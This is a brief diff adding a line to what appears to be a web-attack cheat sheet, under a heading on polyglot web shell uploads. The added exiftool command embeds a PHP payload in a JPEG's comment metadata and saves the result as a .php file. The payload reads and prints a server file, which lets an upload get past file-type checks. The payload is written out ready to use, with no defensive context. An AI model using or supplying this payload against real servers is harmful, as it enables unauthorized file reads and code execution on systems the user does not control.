@@ -19,3 +19,5 @@ Obfuscation :
 Polyglot web shell upload :
       ( Change file metadata to overwrite file type )
       Exiftool 
+      exiftool -Comment="<?php echo 'START ' . file_get_contents('/file') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
